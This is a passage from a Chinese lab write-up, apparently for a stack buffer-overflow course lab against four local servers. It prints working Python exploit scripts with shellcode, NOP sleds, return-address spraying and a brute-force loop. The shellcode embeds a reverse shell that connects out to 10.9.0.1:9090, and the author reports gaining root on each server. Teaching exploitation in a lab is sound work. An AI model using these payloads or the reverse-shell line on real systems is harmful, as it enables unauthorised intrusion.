708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(2558.6,0)"><g data-mml-node="mi"><path data-c="41" d="M255 0Q240 3 140 3Q48 3 39 0H32V46H47Q119 49 139 88Q140 91 192 245T295 553T348 708Q351 716 366 716H376Q396 715 400 709Q402 707 508 390L617 67Q624 54 636 51T687 46H717V0H708Q699 3 581 3Q458 3 437 0H427V46H440Q510 46 510 64Q510 66 486 138L462 209H229L209 150Q189 91 189 85Q189 72 209 59T259 46H264V0H255ZM447 255L345 557L244 256Q244 255 345 255H447Z"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(750,0)"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(1306,0)"></path><path data-c="72" d="M36 46H50Q89 46 97 60V68Q97 77 97 91T98 122T98 161T98 203Q98 234 98 269T98 328L97 351Q94 370 83 376T38 385H20V408Q20 431 22 431L32 432Q42 433 60 434T96 436Q112 437 131 438T160 441T171 442H174V373Q213 441 271 441H277Q322 441 343 419T364 373Q364 352 351 337T313 322Q288 322 276 338T263 372Q263 381 265 388T270 400T273 405Q271 407 250 401Q234 393 226 386Q179 341 179 207V154Q179 141 179 127T179 101T180 81T180 66V61Q181 59 183 57T188 54T193 51T200 49T207 48T216 47T225 47T235 46T245 46H276V0H267Q249 3 140 3Q37 3 28 0H20V46H36Z" transform="translate(1862,0)"></path></g><g data-mml-node="mo" transform="translate(2254,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(2643,0)"><path data-c="45" d="M128 619Q121 626 117 628T101 631T58 634H25V680H597V676Q599 670 611 560T625 444V440H585V444Q584 447 582 465Q578 500 570 526T553 571T528 601T498 619T457 629T411 633T353 634Q266 634 251 633T233 622Q233 622 233 621Q232 619 232 497V376H286Q359 378 377 385Q413 401 416 469Q416 471 416 473V493H456V213H416V233Q415 268 408 288T383 317T349 328T297 330Q290 330 286 330H232V196V114Q232 57 237 52Q243 47 289 47H340H391Q428 47 452 50T505 62T552 92T584 146Q594 172 599 200T607 247T612 270V273H652V270Q651 267 632 137T610 3V0H25V46H58Q100 47 109 49T128 61V619Z"></path><path data-c="42" d="M131 622Q124 629 120 631T104 634T61 637H28V683H229H267H346Q423 683 459 678T531 651Q574 627 599 590T624 512Q624 461 583 419T476 360L466 357Q539 348 595 302T651 187Q651 119 600 67T469 3Q456 1 242 0H28V46H61Q103 47 112 49T131 61V622ZM511 513Q511 560 485 594T416 636Q415 636 403 636T371 636T333 637Q266 637 251 636T232 628Q229 624 229 499V374H312L396 375L406 377Q410 378 417 380T442 393T474 417T499 456T511 513ZM537 188Q537 239 509 282T430 336L329 337H229V200V116Q229 57 234 52Q240 47 334 47H383Q425 47 443 53Q486 67 511 104T537 188Z" transform="translate(681,0)"></path><path data-c="50" d="M130 622Q123 629 119 631T103 634T60 637H27V683H214Q237 683 276 683T331 684Q419 684 471 671T567 616Q624 563 624 489Q624 421 573 372T451 307Q429 302 328 301H234V181Q234 62 237 58Q245 47 304 46H337V0H326Q305 3 182 3Q47 3 38 0H27V46H60Q102 47 111 49T130 61V622ZM507 488Q507 514 506 528T500 564T483 597T450 620T397 635Q385 637 307 637H286Q237 637 234 628Q231 624 231 483V342H302H339Q390 342 423 349T481 382Q507 411 507 488Z" transform="translate(1389,0)"></path></g><g data-mml-node="mo" transform="translate(4713,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mo" transform="translate(7882.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(8883,0)"><g data-mml-node="mn"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mi" transform="translate(500,0)"><path data-c="78" d="M201 0Q189 3 102 3Q26 3 17 0H11V46H25Q48 47 67 52T96 61T121 78T139 96T160 122T180 150L226 210L168 288Q159 301 149 315T133 336T122 351T113 363T107 370T100 376T94 379T88 381T80 383Q74 383 44 385H16V431H23Q59 429 126 429Q219 429 229 431H237V385Q201 381 201 369Q201 367 211 353T239 315T268 274L272 270L297 304Q329 345 329 358Q329 364 327 369T322 376T317 380T310 384L307 385H302V431H309Q324 428 408 428Q487 428 493 431H499V385H492Q443 385 411 368Q394 360 377 341T312 257L296 236L358 151Q424 61 429 57T446 50Q464 46 499 46H516V0H510H502Q494 1 482 1T457 2T432 2T414 3Q403 3 377 3T327 1L304 0H295V46H298Q309 46 320 51T331 63Q331 65 291 120L250 175Q249 174 219 133T185 88Q181 83 181 74Q181 63 188 55T206 46Q208 46 208 23V0H201Z"></path></g><g data-mml-node="mn" transform="translate(1028,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path></g></g><g data-mml-node="mstyle" transform="translate(10911,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mtext" transform="translate(11911,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path><text data-variant="normal" transform="translate(389,0) scale(1,-1)" font-size="884px" font-family="serif">理</text><text data-variant="normal" transform="translate(1389,0) scale(1,-1)" font-size="884px" font-family="serif">论</text><text data-variant="normal" transform="translate(2389,0) scale(1,-1)" font-size="884px" font-family="serif">上</text><text data-variant="normal" transform="translate(3389,0) scale(1,-1)" font-size="884px" font-family="serif">任</text><text data-variant="normal" transform="translate(4389,0) scale(1,-1)" font-size="884px" font-family="serif">意</text><text data-variant="normal" transform="translate(5389,0) scale(1,-1)" font-size="884px" font-family="serif">大</text><text data-variant="normal" transform="translate(6389,0) scale(1,-1)" font-size="884px" font-family="serif">于</text><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z" transform="translate(7389,0)"></path><text data-variant="normal" transform="translate(7889,0) scale(1,-1)" font-size="884px" font-family="serif">的</text><text data-variant="normal" transform="translate(8889,0) scale(1,-1)" font-size="884px" font-family="serif">数</text><text data-variant="normal" transform="translate(9889,0) scale(1,-1)" font-size="884px" font-family="serif">字</text><text data-variant="normal" transform="translate(10889,0) scale(1,-1)" font-size="884px" font-family="serif">都</text><text data-variant="normal" transform="translate(11889,0) scale(1,-1)" font-size="884px" font-family="serif">可</text><text data-variant="normal" transform="translate(12889,0) scale(1,-1)" font-size="884px" font-family="serif">以</text><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" transform="translate(13889,0)"></path></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mrow data-mjx-texclass="ORD"><mi data-mjx-auto-op="false">ret</mi></mrow><mo>=</mo><mrow data-mjx-texclass="ORD"><mi data-mjx-auto-op="false">Addr</mi><mo stretchy="false">(</mo><mi data-mjx-auto-op="false">EBP</mi><mo stretchy="false">)</mo></mrow><mo>+</mo><mrow data-mjx-texclass="ORD"><mn>0</mn><mi mathvariant="normal">x</mi><mn>20</mn></mrow><mstyle scriptlevel="0"><mspace width="1em"></mspace></mstyle><mtext>(理论上任意大于8的数字都可以)</mtext></math></mjx-assistive-mml></mjx-container>
    </span>
  <p>这样最终能成功执行我们的 <code>shellcode</code> ！</p>
<h4 id="执行">执行</h4>
<p>将 <code>\attack-code</code> 中的 <code>exploit.py</code> 填写为分析的内容：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">shellcode= (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># You can modify the following command string to run any command.</span></span><br><span class="line">   <span class="comment"># You can even run multiple commands. When you change the string,</span></span><br><span class="line">   <span class="comment"># make sure that the position of the * at the end doesn&#x27;t change.</span></span><br><span class="line">   <span class="comment"># The code above will change the byte at this position to zero,</span></span><br><span class="line">   <span class="comment"># so the command string ends here.</span></span><br><span class="line">   <span class="comment"># You can delete/add spaces, if needed, to keep the position the same. </span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         * </span></span><br><span class="line">   <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">517</span> - <span class="built_in">len</span>(shellcode)         <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">buffer_addr = <span class="number">0xffffd388</span></span><br><span class="line">ebp_addr = <span class="number">0xffffd3f8</span></span><br><span class="line"></span><br><span class="line">ret    = ebp_addr + <span class="number">0x20</span>     <span class="comment"># Change this number </span></span><br><span class="line">offset = (ebp_addr - buffer_addr) + <span class="number">4</span>              <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[offset:offset + <span class="number">4</span>] = (ret).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>) </span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>
<p>其中 <code>shellcode</code> 的内容是根据实验指导书的内容进行改写。</p>
<p>然后我们运行生成 <code>badfile</code> ，在一个终端内监听 9090 端口，另一个终端发送我们刚刚生成的 <code>badfile</code> 到 server1 中，最终实现的效果为：<img src="%E4%BB%BB%E5%8A%A12-2_%E6%94%BB%E5%87%BB%E6%88%90%E5%8A%9F.png" alt="任务2-2攻击成功"></p>
<p>成功获取到了服务器1的root权限。</p>
<h2 id="任务-3-第二关">任务 3: 第二关</h2>
<p>首先我们向服务器发送响应，得到基础信息：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">server-2-10.9.0.6 | Got a connection from 10.9.0.1</span><br><span class="line">server-2-10.9.0.6 | Starting stack</span><br><span class="line">server-2-10.9.0.6 | Input size: 6</span><br><span class="line">server-2-10.9.0.6 | Buffer&#x27;s address inside bof():     0xffffd338</span><br><span class="line">server-2-10.9.0.6 | ==== Returned Properly ====</span><br></pre></td></tr></table></figure>
<p>由此可知：</p>
<ul>
<li>Buffer’s Address: 缓冲区在内存中的起始位置为 <code>0xffffd388</code>。</li>
</ul>
<p>由实验手册可得， server2 的响应只会提供当前的 <code>buffer_addr</code> ，并不知道 <code>ebp_addr</code> ，也就不能知道精准的 <code>Return Address</code> 位置。我们现在攻击的思路是<strong>覆盖所有可能性</strong>。</p>
<p>分析：</p>
<ul>
<li><code>Return Address</code> (RET) 肯定在 <code>Saved EBP</code> 的上面。</li>
<li>假设缓冲区大小的范围是已知的，例如缓冲区大小范围（以字节为单位）: [100, 200]。</li>
<li>由于内存对齐的原因， 在 32 位程序中帧指针的值总是 4 的倍数，在 64 位程序中则是 8 的倍数。</li>
<li>这意味着 <code>RET</code> 相对于 <code>buffer</code> 起始位置的偏移量，大概在 <strong>104</strong> (100+4) 到 <strong>212</strong> (200+8+4) 之间。我们将这个范围称为**“危险区”**。</li>
<li>既然不知道 <code>RET</code> 具体在危险区的哪个点，那我们就<strong>把整个危险区全部填满同一个跳转地址</strong>。</li>
</ul>
<table>
<thead>
<tr>
<th><strong>区域范围 (近似)</strong></th>
<th><strong>内容</strong></th>
<th><strong>作用</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>0 ~ 100</strong></td>
<td><code>NOP (0x90)</code></td>
<td>前置填充</td>
</tr>
<tr>
<td><strong>100 ~ 220</strong></td>
<td><strong>跳转地址 (RET) x N</strong></td>
<td><strong>[喷射区]</strong> 这里覆盖了所有可能的返回地址位置</td>
</tr>
<tr>
<td><strong>220 ~ 400</strong></td>
<td><code>NOP (0x90)</code></td>
<td><strong>[着陆区]</strong> 跳转地址指向这里</td>
</tr>
<tr>
<td><strong>End</strong></td>
<td><strong>Shellcode</strong></td>
<td>恶意代码放在最后</td>
</tr>
</tbody>
</table>
<p>修改我们任务1中的 <code>exploit.py</code> 攻击代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shellcode 放在最后</span></span><br><span class="line">start = <span class="number">517</span> - <span class="built_in">len</span>(shellcode)</span><br><span class="line">content[start:] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># ret 需要跳在着陆区</span></span><br><span class="line"><span class="comment"># 喷射区大概到 220 结束。</span></span><br><span class="line"><span class="comment"># 我们选一个安全的数字，比如 300。</span></span><br><span class="line">ret = buffer_addr + <span class="number">300</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># 喷射覆盖所有可能的 RET 位置</span></span><br><span class="line"><span class="comment"># 为了安全考虑，我们扩大喷射区的范围</span></span><br><span class="line"><span class="comment"># 步长为 4，因为地址是 4 字节的。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>, <span class="number">230</span>, <span class="number">4</span>):</span><br><span class="line">    content[offset : offset + <span class="number">4</span>] = (ret).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>之后，我们故技重施，将 <code>badfile</code> 发送给 server2，成功获取 root 权限：<img src="%E4%BB%BB%E5%8A%A13-2_%E6%94%BB%E5%87%BB%E6%88%90%E5%8A%9F.png" alt="任务3-2攻击成功"></p>
<h2 id="任务-4：第-3-关">任务 4：第 3 关</h2>
<p>首先我们向服务器发送响应，得到基础信息：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">server-3-10.9.0.7 | Got a connection from 10.9.0.1</span><br><span class="line">server-3-10.9.0.7 | Starting stack</span><br><span class="line">server-3-10.9.0.7 | Input size: 6</span><br><span class="line">server-3-10.9.0.7 | Frame Pointer (rbp) inside bof():  0x00007fffffffe330</span><br><span class="line">server-3-10.9.0.7 | Buffer&#x27;s address inside bof():     0x00007fffffffe260</span><br><span class="line">server-3-10.9.0.7 | ==== Returned Properly ====</span><br></pre></td></tr></table></figure>
<p>由此可知：</p>
<ul>
<li>Buffer’s Address: 缓冲区在内存中的起始位置为 <code>0x00007fffffffe260</code>。</li>
<li>RBP: 当前栈帧的底部指针为 <code>0x00007fffffffe330</code>。</li>
</ul>
<p>根据实验指导书，在 x64 架构下，我们的内存地址空间只支持 <code>0x00</code> 到 <code>0x00007FFFFFFFFFFF</code> 的地址。因此最终计算得出的 <code>Return Address</code> 的位置一定是这个范围内的，类似于 <code>\x70 \xe0 \xff \xff \xff \x7f \x00 \x00</code> 的排布。由于 <code>strcpy</code> 的限制，当遇到 <code>\0</code> 时认为是字符串结束，从而结束复制。</p>
<p>如果采取我们之前的策略，将 <code>shellcode</code> 放在 <code>badfile</code> 的末尾，会导致 <code>strcpy</code> 还没复制 <code>shellcode</code> 的部分就已经停止复制。</p>
<p>由于我们本次任务中 <code>buffer</code> 缓冲区足够大，我们能够将shellcode放在 <code>buffer</code> 中（<code>Return Address</code> 之前），因此我们的策略就是把 <code>shellcode</code> 放在前面，此时我们的 Payload 结构为：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">低地址 (Buffer 开始)</span><br><span class="line">|  Shellcode (恶意代码)   </span><br><span class="line">|  ------------------</span><br><span class="line">|  NOP       </span><br><span class="line">|  ------------------</span><br><span class="line">|  Return Address         </span><br><span class="line">高地址</span><br></pre></td></tr></table></figure>
<p>我们修改 <code>exploit.py</code> ，首先将 <code>shellcode</code> 修改为64位的版本，然后我们修改主要部分：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 把它放在前面，比如 Buffer 开头往后 10 个字节的地方,留一点 NOP 当缓冲</span></span><br><span class="line">start = <span class="number">10</span>        <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">rbp_addr = <span class="number">0x00007fffffffe330</span> </span><br><span class="line">buffer_addr = <span class="number">0x00007fffffffe260</span></span><br><span class="line"></span><br><span class="line">offset = (rbp_addr - buffer_addr) + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">ret = buffer_addr</span><br><span class="line"></span><br><span class="line">content[offset : offset + <span class="number">8</span>] = (ret).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>之后，我们故技重施，将 <code>badfile</code> 发送给 server3，成功获取 root 权限：<img src="%E4%BB%BB%E5%8A%A14-1_%E6%94%BB%E5%87%BB%E6%88%90%E5%8A%9F.png" alt="任务4-1攻击成功"></p>
<h2 id="任务-5：第-4-关">任务 5：第 4 关</h2>
<p>首先我们向服务器发送响应，得到基础信息：<img src="%E4%BB%BB%E5%8A%A15-1_%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%93%8D%E5%BA%94.png" alt="任务5-1服务器响应"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">server-4-10.9.0.8 | Input size: 6</span><br><span class="line">server-4-10.9.0.8 | Frame Pointer (rbp) inside bof():  0x00007fffffffe450</span><br><span class="line">server-4-10.9.0.8 | Buffer&#x27;s address inside bof():     0x00007fffffffe3f0</span><br><span class="line">server-4-10.9.0.8 | ==== Returned Properly ====</span><br></pre></td></tr></table></figure>
<p>由此可知：</p>
<ul>
<li>Buffer’s Address: 缓冲区在内存中的起始位置为 <code>0x00007fffffffe3f0</code>。</li>
<li>RBP: 当前栈帧的底部指针为 <code>0x00007fffffffe450</code>。</li>
</ul>
<p>可以看到帧指针和缓冲区地址之间的距离比第 3 级要小得多，我们无法在开头注入 <code>shellcode</code> 。</p>
<p>我们思考一下，在 <code>bof</code> 函数内我们使用了 <code>strcpy(buffer, str)</code> 来向 <code>buffer</code> 注入 <code>shellcode</code>，因此这个 <code>str</code> 一定保存了我们的原始数据，其中就能包含 <code>shellcode</code>。</p>
<p>回忆一下 <code>stack.c</code> 的工作流程：<code>main函数调用 fread(str, sizeof(char), 517, stdin) -&gt; main函数调用 foo(str) -&gt; foo函数调用 bof(str) -&gt; bof函数调用 strcpy(buffer, str)</code> ，<code>main</code> 函数栈帧应该是栈的最顶部位置，因此我们尝试暴力破解之间的距离:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">517</span> - <span class="built_in">len</span>(shellcode)        <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">rbp_addr = <span class="number">0x00007fffffffe450</span></span><br><span class="line">buffer_addr = <span class="number">0x00007fffffffe3f0</span></span><br><span class="line"></span><br><span class="line">offset = (rbp_addr - buffer_addr) + <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试范围：0 到 2000 字节</span></span><br><span class="line"><span class="keyword">for</span> distance <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">2000</span>, <span class="number">32</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 计算目标跳转地址：从 RBP 往高地址跳 distance 距离</span></span><br><span class="line">    ret = rbp_addr + distance</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Trying distance: <span class="subst">&#123;distance&#125;</span>\nRet Addr: <span class="subst">&#123;<span class="built_in">hex</span>(ret)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 写入跳转地址</span></span><br><span class="line">    content[offset : offset + <span class="number">8</span>] = (ret).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 生成文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">      f.write(content)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送攻击</span></span><br><span class="line">    <span 